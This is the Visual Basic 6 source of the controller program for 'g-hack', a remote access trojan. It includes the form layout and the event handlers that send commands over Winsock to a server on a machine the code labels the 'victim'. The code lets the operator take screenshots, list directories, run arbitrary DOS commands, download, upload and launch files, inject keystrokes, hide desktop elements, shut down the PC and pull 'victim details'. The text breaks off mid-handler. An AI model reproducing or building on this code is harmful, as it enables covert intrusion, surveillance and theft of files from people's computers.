VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   AutoRedraw      =   -1  'True
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   3720
   ClientLeft      =   45
   ClientTop       =   300
   ClientWidth     =   6435
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "MainForm.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3720
   ScaleWidth      =   6435
   StartUpPosition =   2  'CenterScreen
   Begin MSWinsockLib.Winsock client 
      Left            =   480
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   960
      Top             =   2640
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   1440
      Top             =   2520
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   14
      ImageHeight     =   14
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   8
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MainForm.frx":030A
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MainForm.frx":2ABE
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MainForm.frx":2F12
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MainForm.frx":56C6
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MainForm.frx":5FA2
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MainForm.frx":63F6
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MainForm.frx":684A
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MainForm.frx":6B66
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   3135
      Left            =   120
      TabIndex        =   5
      Top             =   120
      Width           =   2055
      _ExtentX        =   3625
      _ExtentY        =   5530
      View            =   2
      LabelWrap       =   -1  'True
      HideSelection   =   0   'False
      _Version        =   393217
      Icons           =   "ImageList1"
      SmallIcons      =   "ImageList1"
      ColHdrIcons     =   "ImageList1"
      ForeColor       =   0
      BackColor       =   14737632
      BorderStyle     =   1
      Appearance      =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   0
   End
   Begin VB.Frame SpyingFrame 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      ForeColor       =   &H80000008&
      Height          =   2760
      Left            =   2400
      TabIndex        =   12
      Top             =   480
      Width           =   3855
      Begin VB.CommandButton Command8 
         Caption         =   "&Active tasks"
         Enabled         =   0   'False
         Height          =   375
         Left            =   240
         TabIndex        =   29
         Top             =   1920
         Width           =   1455
      End
      Begin VB.CommandButton Command7 
         Caption         =   "&Directory list"
         Height          =   375
         Left            =   240
         TabIndex        =   28
         Top             =   1440
         Width           =   1455
      End
      Begin VB.CommandButton Command6 
         Caption         =   "&Screen shot"
         Height          =   375
         Left            =   240
         TabIndex        =   27
         Top             =   960
         Width           =   1455
      End
      Begin VB.CommandButton Command5 
         Caption         =   "&Window shot"
         Height          =   375
         Left            =   240
         TabIndex        =   26
         Top             =   480
         Width           =   1455
      End
      Begin VB.Label Label12 
         BackStyle       =   0  'Transparent
         Caption         =   "returns list of active tasks"
         Height          =   255
         Left            =   1800
         TabIndex        =   33
         Top             =   2040
         Width           =   2055
      End
      Begin VB.Label Label11 
         BackStyle       =   0  'Transparent
         Caption         =   "returns directory lists"
         Height          =   255
         Left            =   1800
         TabIndex        =   32
         Top             =   1560
         Width           =   1815
      End
      Begin VB.Label Label10 
         BackStyle       =   0  'Transparent
         Caption         =   "shows screen shot"
         Height          =   255
         Left            =   1800
         TabIndex        =   31
         Top             =   1080
         Width           =   1695
      End
      Begin VB.Label Label9 
         BackStyle       =   0  'Transparent
         Caption         =   "shows active window"
         Height          =   255
         Left            =   1800
         TabIndex        =   30
         Top             =   600
         Width           =   1815
      End
   End
   Begin VB.Frame InformationFrame 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      ForeColor       =   &H80000008&
      Height          =   2760
      Left            =   2400
      TabIndex        =   11
      Top             =   480
      Width           =   3855
      Begin VB.CommandButton Command4 
         Caption         =   "&Change ICQ No."
         Height          =   375
         Left            =   240
         TabIndex        =   21
         Top             =   1920
         Width           =   1455
      End
      Begin VB.CommandButton Command3 
         Caption         =   "&ICQ Notify No."
         Height          =   375
         Left            =   240
         TabIndex        =   20
         Top             =   1440
         Width           =   1455
      End
      Begin VB.CommandButton Command2 
         Caption         =   "&Victim Details"
         Height          =   375
         Left            =   240
         TabIndex        =   19
         Top             =   960
         Width           =   1455
      End
      Begin VB.CommandButton Command1 
         Caption         =   "&Server Version"
         Height          =   375
         Left            =   240
         TabIndex        =   18
         Top             =   480
         Width           =   1455
      End
      Begin VB.Label Label8 
         BackStyle       =   0  'Transparent
         Caption         =   "change icq notification no."
         Height          =   255
         Left            =   1800
         TabIndex        =   25
         Top             =   2040
         Width           =   1935
      End
      Begin VB.Label Label7 
         BackStyle       =   0  'Transparent
         Caption         =   "current icq notification no."
         Height          =   255
         Left            =   1800
         TabIndex        =   24
         Top             =   1560
         Width           =   1935
      End
      Begin VB.Label Label6 
         BackStyle       =   0  'Transparent
         Caption         =   "returns victim details"
         Height          =   255
         Left            =   1800
         TabIndex        =   23
         Top             =   1080
         Width           =   1815
      End
      Begin VB.Label Label5 
         BackStyle       =   0  'Transparent
         Caption         =   "returns server version"
         Height          =   255
         Left            =   1800
         TabIndex        =   22
         Top             =   600
         Width           =   1815
      End
   End
   Begin VB.Frame ConnectionFrame 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      ForeColor       =   &H80000008&
      Height          =   2760
      Left            =   2400
      TabIndex        =   6
      Top             =   480
      Width           =   3855
      Begin VB.CommandButton cmdDisconnect 
         Caption         =   "&Disconnect"
         Height          =   375
         Left            =   240
         TabIndex        =   4
         Top             =   2160
         Width           =   1575
      End
      Begin VB.CommandButton CmdConnect 
         Caption         =   "&Connect"
         Default         =   -1  'True
         Height          =   375
         Left            =   1920
         TabIndex        =   3
         Top             =   2160
         Width           =   1695
      End
      Begin VB.TextBox txtRemotePort 
         Height          =   315
         Left            =   2640
         TabIndex        =   2
         Text            =   "4220"
         Top             =   600
         Width           =   975
      End
      Begin VB.TextBox txtRemoteIP 
         Height          =   315
         Left            =   240
         TabIndex        =   1
         Top             =   600
         Width           =   2175
      End
      Begin VB.Line Line1 
         X1              =   840
         X2              =   3600
         Y1              =   1200
         Y2              =   1200
      End
      Begin VB.Label LabelConnectVersion 
         BackStyle       =   0  'Transparent
         Caption         =   "n/a"
         Height          =   255
         Left            =   960
         TabIndex        =   10
         Top             =   1320
         Width           =   2655
      End
      Begin VB.Label LabelConnect 
         BackStyle       =   0  'Transparent
         Caption         =   "not connected to server"
         Height          =   255
         Left            =   840
         TabIndex        =   9
         Top             =   1200
         Width           =   2535
      End
      Begin VB.Image Image2 
         Height          =   480
         Left            =   240
         Picture         =   "MainForm.frx":7A42
         Top             =   1080
         Width           =   480
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "port"
         Height          =   255
         Left            =   2640
         TabIndex        =   8
         Top             =   360
         Width           =   975
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   "remote ip address"
         Height          =   255
         Left            =   240
         TabIndex        =   7
         Top             =   360
         Width           =   2175
      End
   End
   Begin VB.Frame LocalOptionsFrame 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      ForeColor       =   &H80000008&
      Height          =   2760
      Left            =   2400
      TabIndex        =   17
      Top             =   480
      Width           =   3855
      Begin VB.CommandButton Command16 
         Caption         =   "&Status log"
         Height          =   375
         Left            =   240
         TabIndex        =   57
         Top             =   1920
         Width           =   1455
      End
      Begin VB.CommandButton Command15 
         Caption         =   "&Remove server"
         Height          =   375
         Left            =   240
         TabIndex        =   56
         Top             =   1440
         Width           =   1455
      End
      Begin VB.CommandButton Command14 
         Caption         =   "&Close server"
         Height          =   375
         Left            =   240
         TabIndex        =   55
         Top             =   960
         Width           =   1455
      End
      Begin VB.CommandButton Command13 
         Caption         =   "DOS command"
         Height          =   375
         Left            =   240
         TabIndex        =   53
         Top             =   480
         Width           =   1455
      End
      Begin VB.Label Label22 
         BackStyle       =   0  'Transparent
         Caption         =   "shows status log"
         Height          =   255
         Left            =   1800
         TabIndex        =   60
         Top             =   2040
         Width           =   1935
      End
      Begin VB.Label Label21 
         BackStyle       =   0  'Transparent
         Caption         =   "clear server off remote pc"
         Height          =   255
         Left            =   1800
         TabIndex        =   59
         Top             =   1560
         Width           =   1935
      End
      Begin VB.Label Label20 
         BackStyle       =   0  'Transparent
         Caption         =   "close server on remote pc"
         Height          =   255
         Left            =   1800
         TabIndex        =   58
         Top             =   1080
         Width           =   1935
      End
      Begin VB.Label Label19 
         BackStyle       =   0  'Transparent
         Caption         =   "executes dos command"
         Height          =   255
         Left            =   1800
         TabIndex        =   54
         Top             =   600
         Width           =   1935
      End
   End
   Begin VB.Frame FunAnnoyingFrame 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      ForeColor       =   &H80000008&
      Height          =   2760
      Left            =   2400
      TabIndex        =   16
      Top             =   480
      Width           =   3855
      Begin VB.CommandButton Command27 
         Caption         =   "&sendkeys"
         Height          =   375
         Left            =   2160
         TabIndex        =   77
         Top             =   2160
         Width           =   1455
      End
      Begin VB.CommandButton Command24 
         Caption         =   "&shutdown pc"
         Height          =   375
         Left            =   2160
         TabIndex        =   72
         Top             =   1680
         Width           =   1455
      End
      Begin VB.CommandButton Command23 
         Caption         =   "&restart pc"
         Height          =   375
         Left            =   2160
         TabIndex        =   71
         Top             =   1200
         Width           =   1455
      End
      Begin VB.CommandButton Command22 
         Caption         =   "&close cd tray"
         Height          =   375
         Left            =   2160
         TabIndex        =   70
         Top             =   720
         Width           =   1455
      End
      Begin VB.CommandButton Command21 
         Caption         =   "&open cd tray"
         Height          =   375
         Left            =   2160
         TabIndex        =   69
         Top             =   240
         Width           =   1455
      End
      Begin VB.CommandButton Command20 
         Caption         =   "&clock"
         Height          =   375
         Left            =   240
         TabIndex        =   66
         Top             =   2160
         Width           =   1455
      End
      Begin VB.CommandButton Command19 
         Caption         =   "&system tray"
         Height          =   375
         Left            =   240
         TabIndex        =   65
         Top             =   1680
         Width           =   1455
      End
      Begin VB.CommandButton Command18 
         Caption         =   "&taskbar"
         Height          =   375
         Left            =   240
         TabIndex        =   64
         Top             =   1200
         Width           =   1455
      End
      Begin VB.CommandButton Command17 
         Caption         =   "&desktop icons"
         Height          =   375
         Left            =   240
         TabIndex        =   63
         Top             =   720
         Width           =   1455
      End
      Begin VB.OptionButton OptShow 
         BackColor       =   &H00C0C0C0&
         Caption         =   "show"
         Height          =   255
         Left            =   840
         TabIndex        =   62
         Top             =   360
         Width           =   855
      End
      Begin VB.OptionButton OptHide 
         BackColor       =   &H00C0C0C0&
         Caption         =   "hide"
         Height          =   255
         Left            =   240
         TabIndex        =   61
         Top             =   360
         Value           =   -1  'True
         Width           =   735
      End
      Begin VB.Line Line2 
         X1              =   1920
         X2              =   1920
         Y1              =   360
         Y2              =   2520
      End
   End
   Begin VB.Frame VictimChatFrame 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      ForeColor       =   &H80000008&
      Height          =   2760
      Left            =   2400
      TabIndex        =   15
      Top             =   480
      Width           =   3855
      Begin VB.CommandButton Command26 
         Caption         =   "&Close"
         Height          =   375
         Left            =   2880
         TabIndex        =   76
         Top             =   2280
         Width           =   855
      End
      Begin VB.CommandButton Command12 
         Caption         =   "&Send"
         Height          =   375
         Left            =   2880
         TabIndex        =   52
         Top             =   1800
         Width           =   855
      End
      Begin VB.TextBox Text2 
         Height          =   315
         Left            =   120
         MaxLength       =   90
         TabIndex        =   51
         Top             =   1800
         Width           =   2655
      End
      Begin VB.ListBox List1 
         Height          =   1110
         Left            =   120
         TabIndex        =   49
         Top             =   480
         Width           =   3615
      End
      Begin VB.Label Label18 
         BackStyle       =   0  'Transparent
         Caption         =   "Chat window:"
         Height          =   255
         Left            =   120
         TabIndex        =   50
         Top             =   240
         Width           =   1815
      End
   End
   Begin VB.Frame MessageBoxesFrame 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      ForeColor       =   &H80000008&
      Height          =   2760
      Left            =   2400
      TabIndex        =   14
      Top             =   480
      Width           =   3855
      Begin VB.TextBox Text4 
         Height          =   315
         Left            =   360
         TabIndex        =   43
         Text            =   "message title"
         Top             =   840
         Width           =   3255
      End
      Begin VB.CommandButton Command11 
         Caption         =   "&Send Message"
         Height          =   375
         Left            =   2160
         TabIndex        =   46
         Top             =   2160
         Width           =   1455
      End
      Begin VB.TextBox Text1 
         Height          =   795
         Left            =   360
         MaxLength       =   160
         MultiLine       =   -1  'True
         TabIndex        =   45
         Text            =   "MainForm.frx":91F4
         Top             =   1200
         Width           =   3255
      End
      Begin VB.OptionButton OptCritical 
         BackColor       =   &H00C0C0C0&
         Height          =   210
         Left            =   2880
         TabIndex        =   44
         Top             =   480
         Width           =   255
      End
      Begin VB.OptionButton OptExclamation 
         BackColor       =   &H00C0C0C0&
         Height          =   210
         Left            =   2040
         TabIndex        =   42
         Top             =   480
         Width           =   255
      End
      Begin VB.OptionButton OptInformation 
         BackColor       =   &H00C0C0C0&
         Height          =   210
         Left            =   1200
         TabIndex        =   41
         Top             =   480
         Value           =   -1  'True
         Width           =   255
      End
      Begin VB.OptionButton OptQuestion 
         BackColor       =   &H00C0C0C0&
         Height          =   210
         Left            =   360
         TabIndex        =   40
         Top             =   480
         Width           =   255
      End
      Begin VB.Label Label16 
         BackStyle       =   0  'Transparent
         Caption         =   "last response:"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   360
         TabIndex        =   47
         Top             =   2160
         Width           =   1455
      End
      Begin VB.Image Image6 
         Height          =   375
         Left            =   3120
         Picture         =   "MainForm.frx":920A
         Stretch         =   -1  'True
         Top             =   360
         Width           =   375
      End
      Begin VB.Image Image5 
         Height          =   375
         Left            =   2280
         Picture         =   "MainForm.frx":964C
         Stretch         =   -1  'True
         Top             =   360
         Width           =   375
      End
      Begin VB.Image Image4 
         Height          =   375
         Left            =   1440
         Picture         =   "MainForm.frx":9A8E
         Stretch         =   -1  'True
         Top             =   360
         Width           =   375
      End
      Begin VB.Image Image3 
         Height          =   375
         Left            =   600
         Picture         =   "MainForm.frx":9ED0
         Stretch         =   -1  'True
         Top             =   360
         Width           =   375
      End
      Begin VB.Label Label17 
         BackStyle       =   0  'Transparent
         Caption         =   "none"
         Height          =   255
         Left            =   360
         TabIndex        =   48
         Top             =   2280
         Width           =   1695
      End
   End
   Begin VB.Frame FileTransfersFrame 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0C0&
      ForeColor       =   &H80000008&
      Height          =   2760
      Left            =   2400
      TabIndex        =   13
      Top             =   480
      Width           =   3855
      Begin VB.CommandButton Command25 
         Caption         =   "&Shell"
         Height          =   375
         Left            =   240
         TabIndex        =   67
         Top             =   1440
         Width           =   1455
      End
      Begin VB.CommandButton Command10 
         Caption         =   "&Upload File"
         Height          =   375
         Left            =   240
         TabIndex        =   37
         Top             =   960
         Width           =   1455
      End
      Begin VB.CommandButton Command9 
         Caption         =   "&Download File"
         Height          =   375
         Left            =   240
         TabIndex        =   36
         Top             =   480
         Width           =   1455
      End
      Begin MSComctlLib.ProgressBar ProgressBar1 
         Height          =   255
         Left            =   240
         TabIndex        =   34
         Top             =   2280
         Width           =   2895
         _ExtentX        =   5106
         _ExtentY        =   450
         _Version        =   393216
         Appearance      =   1
      End
      Begin VB.Label Label24 
         BackStyle       =   0  'Transparent
         Caption         =   "not downloading ..."
         Height          =   255
         Left            =   240
         TabIndex        =   73
         Top             =   2040
         Width           =   2895
      End
      Begin VB.Label Label23 
         BackStyle       =   0  'Transparent
         Caption         =   "shell a file on remote pc"
         Height          =   255
         Left            =   1800
         TabIndex        =   68
         Top             =   1560
         Width           =   1935
      End
      Begin VB.Label Label15 
         BackStyle       =   0  'Transparent
         Caption         =   "upload file to remote pc"
         Height          =   255
         Left            =   1800
         TabIndex        =   39
         Top             =   1080
         Width           =   1935
      End
      Begin VB.Label Label14 
         BackStyle       =   0  'Transparent
         Caption         =   "download file of remote pc"
         Height          =   255
         Left            =   1800
         TabIndex        =   38
         Top             =   600
         Width           =   1935
      End
      Begin VB.Label Label13 
         BackStyle       =   0  'Transparent
         Caption         =   "100%"
         Height          =   255
         Left            =   3240
         TabIndex        =   35
         Top             =   2280
         Width           =   495
      End
   End
   Begin VB.Label TimeLabel 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "12:00"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   135
      Left            =   5400
      TabIndex        =   75
      Top             =   3390
      Width           =   735
   End
   Begin VB.Line Line3 
      BorderColor     =   &H00C0C0C0&
      X1              =   5280
      X2              =   5280
      Y1              =   3360
      Y2              =   3600
   End
   Begin VB.Label Label2 
      BackColor       =   &H00400000&
      Caption         =   " not connected"
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   120
      TabIndex        =   74
      Top             =   3360
      Width           =   6135
   End
   Begin VB.Shape Shape1 
      FillColor       =   &H000000FF&
      FillStyle       =   0  'Solid
      Height          =   255
      Left            =   6000
      Top             =   120
      Width           =   255
   End
   Begin VB.Image Image1 
      Height          =   360
      Left            =   2520
      Picture         =   "MainForm.frx":A312
      Stretch         =   -1  'True
      Top             =   120
      Width           =   360
   End
   Begin VB.Label Label1 
      BackColor       =   &H00404040&
      Caption         =   "              g-hack millenium edition version 1.4"
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   2400
      TabIndex        =   0
      Top             =   120
      Width           =   3855
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim IncBinary As Boolean
Dim IncBinLen As Long
Dim BinSoFar As Long
Dim BinData As String
Dim BinFileName As String
Dim BinSendFileName As String
Dim BinSendFileLength As Long
Dim BinSendSoFar As Long
Dim BinSending As Boolean







Private Sub client_Close()
Shape1.FillColor = vbRed
LabelConnect = "not connected to server"
LabelConnectVersion = "n/a"
CmdConnect.Enabled = True

client.Close
Status "Connection to server has been lost"
End Sub

Private Sub client_DataArrival(ByVal bytesTotal As Long)
Dim IncData As String
 

If IncBinary = True Then
client.GetData BinData1$, vbByte

BinData = BinData & BinData1$
BinSoFar = BinSoFar + bytesTotal


Label13 = Round(BinSoFar / IncBinLen * 100, 0) & "%"
ProgressBar1 = BinSoFar / IncBinLen * 100
If Not Label24 = "Downloading " & BinFileName & ".." Then Label24 = "Downloading " & BinFileName & ".."
Status "Downloading " & BinFileName & " (" & Label13.Caption & ") .."

If BinSoFar = IncBinLen Then


Open App.Path & "\" & BinFileName For Binary As #1
Put #1, , BinData
Close #1
IncBinary = False
Label24 = "Download complete of " & BinFileName
Status BinFileName & " was downloaded successfully"
If Right(BinFileName, 4) = ".txt" Then Shell "notepad " & App.Path & "\" & BinFileName, vbNormalFocus
If Right(BinFileName, 4) = ".jpg" Then Shell "pbrush " & App.Path & "\" & BinFileName, vbNormalFocus
If Right(BinFileName, 4) = ".bmp" Then Shell "pbrush " & App.Path & "\" & BinFileName, vbNormalFocus
End If
Exit Sub
End If

client.GetData IncData


If Mid(IncData, 1, 16) = "binsendfilename:" Then
Dim TempInt01 As Integer

BinFileName = StrReverse(Mid(IncData, 17))
TempInt01 = InStr(1, BinFileName, "\") - 1
BinFileName = Mid(BinFileName, 1, TempInt01)
BinFileName = StrReverse(BinFileName)
Debug.Print BinFileName

If BinFileName = "ghTempIm01.tmp" Then BinFileName = "WindowShot.jpg"
If BinFileName = "ghTempIm02.tmp" Then BinFileName = "ScreenShot.jpg"
IncBinary = True
Send "binaryready2"


Exit Sub
End If


If IncData = "binaryready2" Then
Dim BinData2 As String
Open BinSendFileName For Binary As #1
BinData2 = String(FileLen(BinSendFileName), " ")
Get #1, , BinData2
Close #1
BinSending = True

client.SendData BinData2

Exit Sub
End If

If IncData = "binaryready" Then
BinSendSoFar = 0

Status "Uploading file..."

Send "binsendfilename:" & BinSendFileName

Exit Sub
End If

If Mid(IncData, 1, 7) = "binary:" Then
Dim Temp01 As Integer
Dim Temp02 As Integer
'IncBinary = True

IncBinLen = Mid(IncData, 8)
BinData = ""
BinSoFar = 0
Label24 = "waiting for file, please wait..."
Send "binaryready"



Exit Sub
End If



If Mid(IncData, 1, 5) = "chat:" Then
List1.AddItem " - " & Mid(IncData, 6)
List1.TopIndex = List1.ListCount - 1
Exit Sub
End If

If Mid(IncData, 1, 9) = "response:" Then
Label17 = Time$ & ": " & Mid(IncData, 10)
Status "Messagebox response: " & Mid(IncData, 10)
Exit Sub
End If



Status IncData
End Sub

Private Sub client_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Shape1.FillColor = vbRed
LabelConnect = "not connected to server"
LabelConnectVersion = "n/a"
client.Close
CmdConnect.Enabled = True

Status "Connection to server has been lost"
End Sub

Private Sub client_SendProgress(ByVal bytesSent As Long, ByVal bytesRemaining As Long)
If BinSending = True Then
BinSendSoFar = BinSendSoFar + bytesSent
ProgressBar1 = BinSendSoFar / BinSendFileLength * 100
Label13 = Round(BinSendSoFar / BinSendFileLength * 100, 0) & "%"
Label24 = "Uploading " & BinSendFileName & " (" & Label13 & ") .."
End If
End Sub

Private Sub CmdConnect_Click()
CmdConnect.Enabled = False
Shape1.FillColor = vbYellow
Status "Connecting to " & txtRemoteIP & " port " & txtRemotePort
LabelConnect = "connecting to " & txtRemoteIP
client.Close
client.RemotePort = txtRemotePort
client.RemoteHost = txtRemoteIP
client.Connect txtRemoteIP, txtRemotePort
Do
If client.State = 7 Then GoTo 10
If client.State = 9 Then GoTo 20
DoEvents
Loop


Exit Sub
10 Shape1.FillColor = vbGreen
Status "Connection established to " & txtRemoteIP & " port " & txtRemotePort
LabelConnect = "connected to " & txtRemoteIP & " port " & txtRemotePort
CmdConnect.Enabled = True



Exit Sub
20 Shape1.FillColor = vbRed
Status "Could not connect to server on " & txtRemoteIP & " port " & txtRemotePort
LabelConnect = "not connected to server"
client.Close
CmdConnect.Enabled = True

End Sub

Private Sub cmdDisconnect_Click()
client.Close
Shape1.FillColor = vbRed
Status "Disconnected"
CmdConnect.Enabled = True


End Sub

Private Sub Command1_Click()
Send "serverversion"
End Sub

Private Sub Command10_Click()
On Error GoTo 10
If IncBinary = True Then MsgBox "Binary transfer in progress", vbExclamation, "Error": Exit Sub
BinSendFileName = InputBox("Please enter the filename of the file you wish to upload to the remote pc", "Upload")
Send "uploadpath:" & InputBox("Please enter location to save on remote computer", "Upload Path", "C:\")

ConnectionFrame.Visible = False
InformationFrame.Visible = False
SpyingFrame.Visible = False
FileTransfersFrame.Visible = True
MessageBoxesFrame.Visible = False
VictimChatFrame.Visible = False
FunAnnoyingFrame.Visible = False
LocalOptionsFrame.Visible = False

BinSendFileLength = FileLen(BinSendFileName)
Send "binary:" & BinSendFileLength

Exit Sub
10 MsgBox Err.Description, vbExclamation, "Error"
End Sub

Private Sub Command11_Click()
If OptQuestion.Value = True Then
Send "msgbox:" & Text4 & ":1:" & Text1
Exit Sub
End If

If OptInformation.Value = True Then
Send "msgbox:" & Text4 & ":2:" & Text1
Exit Sub
End If

If OptExclamation.Value = True Then
Send "msgbox:" & Text4 & ":3:" & Text1
Exit Sub
End If

If OptCritical.Value = True Then
Send "msgbox:" & Text4 & ":4:" & Text1
Exit Sub
End If


End Sub

Private Sub Command12_Click()
If Text2 = "" Then Exit Sub
List1.AddItem "" & Text2
Send "chat:" & Text2
Text2 = ""
List1.TopIndex = List1.ListCount - 1
End Sub

Private Sub Command13_Click()
Send "doscommand:" & InputBox("Please enter the MS-DOS command you wish to execute on the remote computer", "MS-DOS Command")
End Sub

Private Sub Command14_Click()
Send "closeserver"
End Sub

Private Sub Command15_Click()
Send "removeserver"

End Sub

Private Sub Command16_Click()
Form2.Show
End Sub

Private Sub Command17_Click()
If OptHide.Value = True Then Send "hidedesktop" Else Send "showdesktop"

End Sub

Private Sub Command18_Click()
If OptHide.Value = True Then Send "hidetaskbar" Else Send "showtaskbar"
End Sub

Private Sub Command19_Click()
If OptHide.Value = True Then Send "hidesystray" Else Send "showsystray"
End Sub

Private Sub Command2_Click()
Send "victimdetails"
End Sub

Private Sub Command20_Click()
If OptHide.Value = True Then Send "hideclock" Else Send "showclock"
End Sub

Private Sub Command21_Click()
Send "opencd"
End Sub

Private Sub Command22_Click()
Send "closecd"

End Sub

Private Sub Command23_Click()
Send "restartpc"
End Sub

Private Sub Command24_Click()
Send "shutdownpc"
End Sub

Private Sub Command25_Click()
Dim tempstring As String
tempstring = InputBox("Please enter the remote filename of the file you want to shell", "Shell File")
Send "shell:" & tempstring

End Sub

Private Sub Command26_Click()
Send "closechat"
List1.Clear
End Sub

Private Sub Command27_Click()
Dim tempstring As String

tempstring = InputBox("Please enter the keys you want to send..", "Send Keys")
Send "sendkeys:" & tempstring

End Sub

Private Sub Command3_Click()
Send "icqno"
End Sub

Private Sub Command4_Click()
Dim tempstring As String
tempstring = InputBox("Please enter new ICQ Notification number", "New ICQ No")
If IsNumeric(tempstring) = False Then MsgBox "Must be numeric", vbExclamation, "Error": Exit Sub
Send "newicq:" & tempstring

End Sub

Private Sub Command5_Click()
Send "winshot"
End Sub

Private Sub Command6_Click()
Send "screenshot"
End Sub

Private Sub Command7_Click()
Send "doscommand:dir " & InputBox("Please enter directory to list, wildcards may be used.", "Directory list") & " > " & "c:\windows\temp\ghdir1.txt"
MsgBox "It is recommended that you wait a while before continuing to give the remote computer time to gather the directory information", vbInformation, "Proceed.."
Send "download:c:\windows\temp\ghdir1.txt"
End Sub

Private Sub Command9_Click()
If IncBinary = True Then MsgBox "Binary transfer in progress", vbExclamation, "Error": Exit Sub
Send "download:" & InputBox("Please enter remote filename of file to download", "Download File")
End Sub

Private Sub Form_Load()


'ConnectionFrame.Visible = False
InformationFrame.Visible = False
SpyingFrame.Visible = False
FileTransfersFrame.Visible = False
MessageBoxesFrame.Visible = False
VictimChatFrame.Visible = False
FunAnnoyingFrame.Visible = False
LocalOptionsFrame.Visible = False

ProgressBar1 = 100

SysTray.AddTrayIcon Image1, Form1.hwnd, "g-hack 2001 v1.4"

ListView1.ListItems.Add , , " connection", 1, 1
ListView1.ListItems.Add , , " info / notify", 2, 2
ListView1.ListItems.Add , , " spying", 3, 3
ListView1.ListItems.Add , , " file transfers", 4, 4
ListView1.ListItems.Add , , " message boxes", 5, 5
ListView1.ListItems.Add , , " victim chat", 6, 6
ListView1.ListItems.Add , , " fun / annoying", 7, 7
ListView1.ListItems.Add , , " other options", 8, 8
ListView1.ListItems(1).Selected = True

txtRemoteIP = RegEdit.ReadKey("HKCU\Software\gHackPro\IP")
txtRemotePort = RegEdit.ReadKey("HKCU\Software\gHackPro\Port")
If txtRemotePort = "" Then txtRemotePort = "4420" Else client.RemotePort = txtRemotePort



End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If SysTray.TrayEvent(X) = "LEFTUP" Then Form1.WindowState = 0: Form1.Show: Form1.SetFocus
End Sub

Private Sub Form_Resize()
If Form1.WindowState = 1 Then Form1.Hide
End Sub

Private Sub Form_Terminate()
SysTray.RemoveTrayIcon
Unload Form2
End Sub

Private Sub Form_Unload(Cancel As Integer)
SysTray.RemoveTrayIcon
Unload Form2
End Sub

Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Windows.MoveForm Form1, Button
End Sub

Private Sub Label2_Click()
Form2.Show
End Sub

Private Sub ListView1_ItemClick(ByVal Item As MSComctlLib.ListItem)
On Error Resume Next
ConnectionFrame.Visible = False
InformationFrame.Visible = False
SpyingFrame.Visible = False
FileTransfersFrame.Visible = False
MessageBoxesFrame.Visible = False
VictimChatFrame.Visible = False
